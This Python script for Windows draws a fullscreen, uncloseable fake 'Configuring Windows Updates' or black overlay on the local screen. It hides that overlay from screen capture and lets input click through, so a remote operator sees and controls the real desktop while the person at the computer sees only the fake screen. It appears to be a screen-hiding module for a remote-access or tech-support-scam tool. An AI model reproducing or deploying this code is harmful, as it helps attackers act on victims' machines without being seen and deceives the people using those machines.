import tkinter as tk
import random
import signal
import ctypes
from ctypes import windll, wintypes

# Windows API Constants
WDA_EXCLUDEFROMCAPTURE = 0x00000011
GWL_EXSTYLE            = -20
WS_EX_LAYERED          = 0x00080000
WS_EX_TRANSPARENT      = 0x00000020
LWA_ALPHA             = 0x00000002

# Define 64-bit safe types for Window Functions
user32 = windll.user32
user32.GetWindowLongPtrW.argtypes = [wintypes.HWND, ctypes.c_int]
user32.GetWindowLongPtrW.restype = ctypes.c_void_p
user32.SetWindowLongPtrW.argtypes = [wintypes.HWND, ctypes.c_int, ctypes.c_void_p]
user32.SetWindowLongPtrW.restype = ctypes.c_void_p

class KioskApp:
    def __init__(self, mode="update"):
        self.root = tk.Tk()
        self._shutdown_requested = False
        self.mode = mode
        
        # Fullscreen and Topmost
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        
        # Configure Appearance based on Mode
        if self.mode == "black":
            self.bg_color = "black"
            self.cursor = "none"
            self.text = "" # Pure Black
            self.text_color = "black"
        elif self.mode == "privacy":
            self.bg_color = "black"
            self.cursor = "none"
            self.text = "Remote Administration in Progress"
            self.text_color = "white"
        else: # update
            self.bg_color = "#006dae"
            self.cursor = "none"
            self.text = "Configuring Windows Updates\n1% complete\n\nDon't turn off your computer"
            self.text_color = "white"

        self.root.configure(background=self.bg_color)
        self.root.configure(cursor=self.cursor)
        
        # Disable Closing via window manager
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # Secret Exit: Ctrl+Shift+Alt+`
        self.root.bind('<Control-Shift-Alt-grave>', lambda e: self._on_exit())
        # Fallback exits
        self.root.bind('<Control-q>', lambda e: self._on_exit())
        self.root.bind('<Escape>', lambda e: self._on_exit())
        
        # Center Frame using element placement for absolute certainty
        self.frame = tk.Frame(self.root, bg=self.bg_color)
        self.frame.place(relx=0.5, rely=0.5, anchor="center")
        
        # Text Label
        self.label = tk.Label(self.frame, 
                              text=self.text,
                              font=("Segoe UI", 36, "bold"), # Increased visibility
                              fg=self.text_color, bg=self.bg_color, justify="center")
        self.label.pack(ipady=20)
        
        # Logic specific to Update Mode
        if self.mode == "update":
            self.progress = 1        
            self.update_progress()
        
        # Force focus and Trap Input (Fallback for BlockInput failure)
        self.root.focus_force()
        self.root.bind('<Unmap>', lambda e: self.root.after(10, self.root.focus_force))
        
        # Trap Mouse in Kiosk Window (Software Lock)
        # This prevents user from clicking outside if BlockInput fails
        self.root.grab_set_global() 
        self.root.bind("<Motion>", self._trap_mouse)
        
        # Apply Windows API Styles (Click-through & Exclusion)
        self.root.after(100, self._apply_window_styles)

    def _trap_mouse(self, event):
        """Keep mouse centered if not update mode (optional, strict lock)"""
        # If we really want to annoy the user / block input:
        if self.mode in ["privacy", "black"]:
            # Move mouse back to center?
            # self.root.event_generate('<Motion>', warp=True, x=self.root.winfo_width()//2, y=self.root.winfo_height()//2)
            pass

    def _apply_window_styles(self):
        """
        Apply Windows extended styles:
        1. WDA_EXCLUDEFROMCAPTURE: Hidden from screen capture (Viewer sees desktop)
        2. WS_EX_TRANSPARENT: Mouse events pass through to desktop
        """
        try:
            # Get the correct HWND for the Toplevel window
            # winfo_id returns the inner window ID. We need the OS-level window handle.
            # On Windows, winfo_id() is often the HWND, but Tkinter nests it.
            # Using command `wm frame .` gives the outer handle usually.
            
            # Alternative: direct windll call to find window by class/name? 
            # Simpler: GetParent of winfo_id often leads to the Frame.
            
            hwnd = windll.user32.GetParent(self.root.winfo_id())
            if not hwnd:
                hwnd = self.root.winfo_id()
                
            print(f"[*] Applying styles to HWND: {hwnd}")

            # 1. Hide from Capture (Viewer sees through)
            # WDA_EXCLUDEFROMCAPTURE = 0x00000011 (Requires Win10 2004+)
            # WDA_NONE = 0x00000000
            # WDA_MONITOR = 0x00000001
            try:
                # Use WDA_EXCLUDEFROMCAPTURE (0x11)
                res = windll.user32.SetWindowDisplayAffinity(hwnd, WDA_EXCLUDEFROMCAPTURE)
                if res == 0:
                     print(f"[-] SetWindowDisplayAffinity failed. Error: {windll.kernel32.GetLastError()}")
                else:
                     print("[+] Set WDA_EXCLUDEFROMCAPTURE success")
            except Exception as e:
                print(f"[-] Failed to set WDA: {e}")

            # 2. Click-Through (Transparent to Input)
            try:
                # Add WS_EX_TRANSPARENT + WS_EX_LAYERED
                # We need WS_EX_LAYERED for transparency to work, even if alpha is 255
                current_ex = windll.user32.GetWindowLongPtrW(hwnd, GWL_EXSTYLE)
                new_ex = current_ex | WS_EX_LAYERED | WS_EX_TRANSPARENT
                
                windll.user32.SetWindowLongPtrW(hwnd, GWL_EXSTYLE, new_ex)
                
                # Note: If we set LAYERED, we might need to explicitly set opacity or it might be invisible?
                # Tkinter usually handles this via 'alpha' attribute, but let's ensure it's opaque visible
                # windll.user32.SetLayeredWindowAttributes(hwnd, 0, 255, LWA_ALPHA)
                print("[+] Set Click-Through (Transparent/Layered) success")
            except Exception as e:
                print(f"[-] Failed to set Click-Through: {e}")
                
        except Exception as e:
            print(f"[-] Window Style Error: {e}")

    def update_progress(self):
        if self.mode != "update": return
            
        if self.progress < 100:
            # Target duration logic: spread 100 increments over ~3-9 hours
            # Avg duration = 6 hours = 21600 seconds
            # Avg per tick = 216 sec (if linear), but we randomize
            
             # Chance to increment (40% chance)
            if random.random() > 0.6: 
                self.progress += 1
                self.label.config(text=f"Configuring Windows Updates\n{self.progress}% complete\n\nDon't turn off your computer")
            
            # Random delay 30-150 seconds (Avg ~1.5 min per tick -> ~3 hours total)
            delay = random.randint(30000, 150000) 
            self.root.after(delay, self.update_progress)
        else:
            # Progress complete - finish up
            self.finish_updates()

    def finish_updates(self):
        """Called when progress reaches 100%"""
        self.label.config(text="Configuring Windows Updates\n100% complete\n\nRestarting...")
        self.root.after(3000, self.restart_updates)

    def restart_updates(self):
        """Reset progress and restart loop to simulate reboot"""
        self.progress = 1
        self.label.config(text="Configuring Windows Updates\n1% complete\n\nDon't turn off your computer")
        self.update_progress()

    def _on_exit(self):
        """Graceful exit handler for signals and secret key"""
        print("[*] Kiosk exit triggered")
        try:
            self.root.quit()
            self.root.destroy()
        except Exception as e:
            print(f"[-] Kiosk exit error: {e}")

    def _signal_handler(self, signum, frame):
        """Lightweight signal handler that sets shutdown flag."""
        self._shutdown_requested = True

    def _check_shutdown(self):
        """Polling callback to check shutdown flag while mainloop is running."""
        if self._shutdown_requested:
            self._on_exit()
        else:
            # Re-schedule check every 500ms
            self.root.after(500, self._check_shutdown)

    def start(self):
        # Register signal handlers that set flag instead of directly calling exit
        try:
            signal.signal(signal.SIGINT, self._signal_handler)
            signal.signal(signal.SIGTERM, self._signal_handler)
        except Exception:
            pass
        
        # Start polling for shutdown flag
        self.root.after(500, self._check_shutdown)
        self.root.mainloop()

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--mode", default="update", help="update|black|privacy")
    args = parser.parse_args()
    
    app = KioskApp(mode=args.mode)
    app.start()

# alr 
